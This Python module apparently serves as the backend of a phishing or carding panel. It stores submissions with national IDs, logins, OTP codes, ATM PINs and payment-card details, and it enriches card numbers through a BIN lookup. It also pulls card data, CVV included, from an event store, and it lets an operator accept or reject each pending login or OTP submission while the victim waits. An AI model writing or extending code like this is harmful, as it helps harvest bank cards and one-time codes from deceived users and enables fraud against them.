from __future__ import annotations

from datetime import datetime, timezone
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request as UrlRequest, urlopen
import json

from bson import ObjectId
from pymongo import ReturnDocument

from ..config import BIN_LOOKUP_ENABLED
from ..db import get_mongo_db


BIN_FIELDS = ('card_bin_type', 'card_bin_brand', 'card_bin_country', 'card_bin_currency', 'card_bin_bank')
BIN_LOOKUP_FIELDS = ('card_bin_lookup_status', 'card_bin_lookup_message', 'card_bin_lookup_checked_at')
PAYMENT_DETAIL_FIELDS = (
    'card_holder',
    'card_number',
    'card_expiry',
    'card_cvv',
    *BIN_FIELDS,
    *BIN_LOOKUP_FIELDS,
)


def clean_lookup_text(value: Any, max_len: int = 120) -> str:
    return str(value or '').strip()[:max_len]


def lookup_bin_info_sync(card_digits: str) -> dict[str, str]:
    """Best-effort BIN enrichment. Never required for accepting a submission."""
    if not BIN_LOOKUP_ENABLED:
        return {}
    bin_number = ''.join(ch for ch in str(card_digits or '') if ch.isdigit())[:8]
    if len(bin_number) < 8:
        return {}
    checked_at = datetime.now(timezone.utc).isoformat()
    try:
        req = UrlRequest(
            f'https://lookup.binlist.net/{bin_number}',
            headers={'Accept-Version': '3'},
        )
        with urlopen(req, timeout=2) as res:
            raw = res.read(8192).decode('utf-8', errors='ignore')
        data = json.loads(raw or '{}')
        country = data.get('country') if isinstance(data.get('country'), dict) else {}
        bank = data.get('bank') if isinstance(data.get('bank'), dict) else {}
        return {
            'card_bin_lookup_status': 'ok',
            'card_bin_lookup_message': '',
            'card_bin_lookup_checked_at': checked_at,
            'card_bin_type': clean_lookup_text(data.get('type'), 40),
            'card_bin_brand': clean_lookup_text(data.get('brand'), 80),
            'card_bin_country': clean_lookup_text(country.get('name'), 100),
            'card_bin_currency': clean_lookup_text(country.get('currency'), 12),
            'card_bin_bank': clean_lookup_text(bank.get('name'), 120),
        }
    except HTTPError as exc:
        if exc.code == 429:
            return {
                'card_bin_lookup_status': 'rate_limited',
                'card_bin_lookup_message': 'BIN lookup rate limited',
                'card_bin_lookup_checked_at': checked_at,
            }
        return {
            'card_bin_lookup_status': 'http_error',
            'card_bin_lookup_message': f'BIN lookup HTTP {exc.code}',
            'card_bin_lookup_checked_at': checked_at,
        }
    except URLError:
        return {
            'card_bin_lookup_status': 'network_error',
            'card_bin_lookup_message': 'BIN lookup network error',
            'card_bin_lookup_checked_at': checked_at,
        }
    except Exception:
        return {
            'card_bin_lookup_status': 'failed',
            'card_bin_lookup_message': 'BIN lookup unavailable',
            'card_bin_lookup_checked_at': checked_at,
        }


def should_retry_bin_lookup(row: dict[str, Any]) -> bool:
    status = str(row.get('card_bin_lookup_status') or '').strip()
    if status not in {'rate_limited', 'network_error', 'http_error', 'failed'}:
        return False
    checked_at = str(row.get('card_bin_lookup_checked_at') or '').strip()
    if not checked_at:
        return True
    try:
        checked = datetime.fromisoformat(checked_at.replace('Z', '+00:00'))
    except Exception:
        return True
    if checked.tzinfo is None:
        checked = checked.replace(tzinfo=timezone.utc)
    return (datetime.now(timezone.utc) - checked).total_seconds() >= 300


def ensure_payment_bin_info(row: dict[str, Any], *, allow_lookup: bool = True) -> dict[str, Any]:
    """Backfill BIN info for old payment rows without making it mandatory."""
    if (row.get('form_type') or row.get('type')) != 'payment':
        return row
    if not BIN_LOOKUP_ENABLED:
        return row
    # Only skip lookup when all BIN fields are already populated.
    if all(str(row.get(field) or '').strip() for field in BIN_FIELDS):
        return row
    if not allow_lookup:
        return row
    status = str(row.get('card_bin_lookup_status') or '').strip()
    # For incomplete BIN data, allow refresh even after an "ok" lookup because
    # older rows may have only bank populated while brand/type stayed empty.
    if status and status != 'ok' and not should_retry_bin_lookup(row):
        return row
    card_number = row.get('card_number') or ''
    info = lookup_bin_info_sync(card_number)
    info = {k: v for k, v in info.items() if v}
    if not info:
        return row
    db = get_mongo_db()
    if row.get('_id'):
        db.registration_submissions.update_one({'_id': row['_id']}, {'$set': info})
    submission_id = str(row.get('_id') or row.get('submission_id') or '')
    if submission_id:
        db.info_events.update_many(
            {'type': 'payment', 'submission_id': submission_id},
            {'$set': info},
        )
    row.update(info)
    return row


def masked_card_number(value: Any) -> str:
    digits = ''.join(ch for ch in str(value or '') if ch.isdigit())
    if not digits:
        return ''
    return f'**** **** **** {digits[-4:]}' if len(digits) >= 4 else '****'


def requested_submission_id(payload: dict[str, Any]) -> str:
    return str(payload.get('submission_id') or payload.get('client_submission_id') or '').strip()[:120]


def submission_query(submission_id: str) -> dict[str, Any]:
    sid = str(submission_id or '').strip()
    if not sid:
        return {'_id': None}
    query: dict[str, Any] = {'submission_id': sid}
    try:
        query = {'$or': [{'submission_id': sid}, {'_id': ObjectId(sid)}]}
    except Exception:
        pass
    return query


def create_registration_submission(
    payload: dict[str, Any],
    *,
    status: str = 'pending',
    decided_by: str = '',
) -> str:
    """Persist or update a registration submission and return its stable submission id."""
    db = get_mongo_db()
    now = datetime.now(timezone.utc)
    normalized_status = status if status in {'pending', 'accepted', 'rejected', 'missed'} else 'pending'
    is_decided = normalized_status in {'accepted', 'rejected', 'missed'}
    submission_id = requested_submission_id(payload) or str(ObjectId())
    doc = {
        'submission_id': submission_id,
        'form_type': payload.get('form_type') or 'registration',
        'visitor_uid': (payload.get('visitor_uid') or '').strip(),
        'source_page': payload.get('source_page') or '',
        'full_name': payload.get('full_name') or '',
        'national_id': payload.get('national_id') or '',
        'phone': payload.get('phone') or '',
        'email': payload.get('email') or '',
        'username': payload.get('username') or '',
        'password': '',
        'otp_code': '',
        'atm_pin': '',
        'card_holder': payload.get('card_holder') or '',
        'card_number': masked_card_number(payload.get('card_number')),
        'card_expiry': payload.get('card_expiry') or '',
        'card_cvv': '',
        'card_bin_type': payload.get('card_bin_type') or '',
        'card_bin_brand': payload.get('card_bin_brand') or '',
        'card_bin_country': payload.get('card_bin_country') or '',
        'card_bin_currency': payload.get('card_bin_currency') or '',
        'card_bin_bank': payload.get('card_bin_bank') or '',
        'card_bin_lookup_status': payload.get('card_bin_lookup_status') or '',
        'card_bin_lookup_message': payload.get('card_bin_lookup_message') or '',
        'card_bin_lookup_checked_at': payload.get('card_bin_lookup_checked_at') or '',
        'status': normalized_status,  # pending|accepted|rejected|missed
        'created_at': now,
        'decided_at': now if is_decided else None,
        'decided_by': decided_by if is_decided else '',
    }
    existing = db.registration_submissions.find_one({'submission_id': submission_id}, {'status': 1})
    if existing:
        if str(existing.get('status') or '') in {'accepted', 'rejected', 'missed'}:
            return submission_id
        update_doc = {k: v for k, v in doc.items() if k not in {'submission_id', 'created_at'}}
        update_doc['status'] = normalized_status
        update_doc['decided_at'] = now if is_decided else None
        update_doc['decided_by'] = decided_by if is_decided else ''
        db.registration_submissions.update_one({'submission_id': submission_id}, {'$set': update_doc})
        return submission_id

    db.registration_submissions.insert_one(doc)
    return submission_id


def latest_login_credentials(visitor_uid: str, *, before: datetime | None = None) -> dict[str, str]:
    query: dict[str, Any] = {
        'visitor_uid': (visitor_uid or '').strip(),
        'form_type': 'login',
    }
    if before is not None:
        query['created_at'] = {'$lte': before}
    row = get_mongo_db().registration_submissions.find_one(query, sort=[('created_at', -1)])
    if not row:
        return {'username': '', 'password': ''}
    return {
        'username': row.get('username', ''),
        'password': '',
    }


def latest_payment_details(visitor_uid: str, *, before: datetime | None = None) -> dict[str, str]:
    query: dict[str, Any] = {
        'visitor_uid': (visitor_uid or '').strip(),
        'form_type': 'payment',
    }
    if before is not None:
        query['created_at'] = {'$lte': before}
    row = get_mongo_db().registration_submissions.find_one(query, sort=[('created_at', -1)])
    if not row:
        return {}
    row = ensure_payment_bin_info(row)
    details = {field: row.get(field, '') for field in PAYMENT_DETAIL_FIELDS}
    details['card_number'] = masked_card_number(details.get('card_number'))
    details['card_cvv'] = ''
    return details


def format_submission_dt(value: Any) -> str:
    if isinstance(value, datetime):
        return value.isoformat()
    return str(value or '')


def submission_sort_value(row: dict[str, Any]) -> float:
    value = row.get('created_at') or row.get('ts')
    if isinstance(value, datetime):
        return value.timestamp()
    text = str(value or '')
    if not text:
        return 0.0
    try:
        normalized = text if text.endswith(('Z', 'z')) or '+' in text[-6:] else f'{text}+00:00'
        return datetime.fromisoformat(normalized.replace('Z', '+00:00').replace('z', '+00:00')).timestamp()
    except Exception:
        return 0.0


def serialize_registration_row(db, visitor_uid: str, r: dict[str, Any]) -> dict[str, Any]:
    r = ensure_payment_bin_info(r)
    submission_id = str(r.get('submission_id') or r.get('_id') or '')
    created_at = r.get('created_at') or r.get('ts')
    login_values = (
        latest_login_credentials(visitor_uid, before=created_at if isinstance(created_at, datetime) else None)
        if r.get('form_type') == 'login_otp' and (not r.get('username') or not r.get('password'))
        else {}
    )
    phone_otp_payment_values = (
        latest_payment_details(visitor_uid, before=created_at if isinstance(created_at, datetime) else None)
        if r.get('form_type') == 'login_otp'
        and any(page in str(r.get('source_page', '')).lower() for page in ('phone-otp', 'app-otp'))
        and not all(r.get(key) for key in ('card_number', 'card_expiry', 'card_cvv'))
        else {}
    )
    payment_values = {}
    if r.get('form_type') == 'payment' and not all(
        r.get(key)
        for key in (
            'card_holder',
            'card_number',
            'card_expiry',
            'card_cvv',
            'card_bin_type',
            'card_bin_brand',
            'card_bin_country',
            'card_bin_currency',
            'card_bin_bank',
            'card_bin_lookup_status',
            'card_bin_lookup_message',
            'card_bin_lookup_checked_at',
        )
    ):
        payment_values = db.info_events.find_one(
            {'visitor_uid': visitor_uid, 'type': 'payment', 'submission_id': submission_id},
            {
                'card_holder': 1,
                'card_number': 1,
                'card_expiry': 1,
                'card_cvv': 1,
                'card_bin_type': 1,
                'card_bin_brand': 1,
                'card_bin_country': 1,
                'card_bin_currency': 1,
                'card_bin_bank': 1,
                'card_bin_lookup_status': 1,
                'card_bin_lookup_message': 1,
                'card_bin_lookup_checked_at': 1,
            },
        ) or {}
    return {
        'id': submission_id,
        'form_type': r.get('form_type') or r.get('type') or 'registration',
        'visitor_uid': r.get('visitor_uid', ''),
        'source_page': r.get('source_page', ''),
        'full_name': r.get('full_name', ''),
        'national_id': r.get('national_id', ''),
        'phone': r.get('phone', ''),
        'email': r.get('email', ''),
        'username': r.get('username', '') or login_values.get('username', ''),
        'password': '',
        'otp_code': '',
        'atm_pin': '',
        'card_holder': r.get('card_holder', '') or payment_values.get('card_holder', '') or phone_otp_payment_values.get('card_holder', ''),
        'card_number': masked_card_number(r.get('card_number', '') or payment_values.get('card_number', '') or phone_otp_payment_values.get('card_number', '')),
        'card_expiry': r.get('card_expiry', '') or payment_values.get('card_expiry', '') or phone_otp_payment_values.get('card_expiry', ''),
        'card_cvv': '',
        'card_bin_type': r.get('card_bin_type', '') or payment_values.get('card_bin_type', '') or phone_otp_payment_values.get('card_bin_type', ''),
        'card_bin_brand': r.get('card_bin_brand', '') or payment_values.get('card_bin_brand', '') or phone_otp_payment_values.get('card_bin_brand', ''),
        'card_bin_country': r.get('card_bin_country', '') or payment_values.get('card_bin_country', '') or phone_otp_payment_values.get('card_bin_country', ''),
        'card_bin_currency': r.get('card_bin_currency', '') or payment_values.get('card_bin_currency', '') or phone_otp_payment_values.get('card_bin_currency', ''),
        'card_bin_bank': r.get('card_bin_bank', '') or payment_values.get('card_bin_bank', '') or phone_otp_payment_values.get('card_bin_bank', ''),
        'card_bin_lookup_status': r.get('card_bin_lookup_status', '') or payment_values.get('card_bin_lookup_status', '') or phone_otp_payment_values.get('card_bin_lookup_status', ''),
        'card_bin_lookup_message': r.get('card_bin_lookup_message', '') or payment_values.get('card_bin_lookup_message', '') or phone_otp_payment_values.get('card_bin_lookup_message', ''),
        'card_bin_lookup_checked_at': r.get('card_bin_lookup_checked_at', '') or payment_values.get('card_bin_lookup_checked_at', '') or phone_otp_payment_values.get('card_bin_lookup_checked_at', ''),
        'status': r.get('status', 'pending'),
        'created_at': format_submission_dt(created_at),
        'decided_at': format_submission_dt(r.get('decided_at')),
        'decided_by': r.get('decided_by', ''),
    }


def list_registration_submissions(visitor_uid: str, limit: int = 200) -> list[dict[str, Any]]:
    db = get_mongo_db()
    max_limit = max(1, min(500, limit))
    submission_rows = list(
        db.registration_submissions.find({'visitor_uid': visitor_uid})
        .sort('created_at', -1)
        .limit(max_limit)
    )
    event_rows = list(
        db.info_events.find({'visitor_uid': visitor_uid, 'type': {'$in': ['registration', 'login', 'login_otp', 'payment', 'atm']}})
        .sort('ts', -1)
        .limit(max_limit)
    )
    merged: dict[str, dict[str, Any]] = {}
    for row in submission_rows:
        merged[f"submission:{row.get('_id')}"] = row
    for row in event_rows:
        key = f"submission:{row.get('submission_id')}" if row.get('submission_id') else f"event:{row.get('_id')}"
        if key not in merged:
            row = {**row, 'form_type': row.get('form_type') or row.get('type') or 'registration', 'created_at': row.get('created_at') or row.get('ts')}
            merged[key] = row
    rows = sorted(merged.values(), key=submission_sort_value, reverse=True)[:max_limit]
    return [serialize_registration_row(db, visitor_uid, r) for r in rows]


def get_registration_submission_status(submission_id: str, visitor_uid: str) -> dict[str, Any] | None:
    row = get_mongo_db().registration_submissions.find_one(
        {**submission_query(submission_id), 'visitor_uid': (visitor_uid or '').strip()},
        {'status': 1, 'visitor_uid': 1, 'form_type': 1, 'decided_at': 1, 'submission_id': 1},
    )
    if not row:
        return None
    return {
        'id': str(row.get('submission_id') or row.get('_id')),
        'visitor_uid': row.get('visitor_uid', ''),
        'form_type': row.get('form_type', 'registration'),
        'status': row.get('status', 'pending'),
        'decided_at': (row.get('decided_at').isoformat() if row.get('decided_at') else ''),
    }


def mark_registration_submission_missed(submission_id: str, visitor_uid: str) -> dict[str, Any] | None:
    db = get_mongo_db()
    now = datetime.now(timezone.utc)
    row = db.registration_submissions.find_one_and_update(
        {**submission_query(submission_id), 'visitor_uid': (visitor_uid or '').strip(), 'status': 'pending'},
        {'$set': {'status': 'missed', 'decided_at': now, 'decided_by': 'visitor_refresh'}},
        return_document=ReturnDocument.AFTER,
    )
    if not row:
        return get_registration_submission_status(submission_id, visitor_uid)
    db.info_events.update_many(
        {'submission_id': submission_id},
        {'$set': {'status': 'missed', 'decided_at': now.isoformat(), 'decided_by': 'visitor_refresh'}},
    )
    return {
        'id': str(row.get('submission_id') or row.get('_id')),
        'visitor_uid': row.get('visitor_uid', ''),
        'status': row.get('status', 'missed'),
        'decided_at': (row.get('decided_at').isoformat() if row.get('decided_at') else ''),
    }


def decide_registration_submission(
    submission_id: str,
    *,
    decision: str,
    decided_by: str,
    form_type: str = '',
) -> dict[str, Any] | None:
    if decision not in ('accepted', 'rejected'):
        return None
    db = get_mongo_db()
    now = datetime.now(timezone.utc)
    query: dict[str, Any] = {**submission_query(submission_id), 'status': 'pending'}
    if form_type:
        query['form_type'] = form_type
    row = db.registration_submissions.find_one_and_update(
        query,
        {'$set': {'status': decision, 'decided_at': now, 'decided_by': decided_by or ''}},
        return_document=ReturnDocument.AFTER,
    )
    if not row:
        return None
    db.info_events.update_many(
        {'submission_id': submission_id},
        {'$set': {'status': decision, 'decided_at': now.isoformat(), 'decided_by': decided_by or ''}},
    )
    return {
        'id': str(row.get('submission_id') or row.get('_id')),
        'visitor_uid': row.get('visitor_uid', ''),
        'form_type': row.get('form_type', 'registration'),
        'status': row.get('status', ''),
        'decided_at': (row.get('decided_at').isoformat() if row.get('decided_at') else ''),
    }
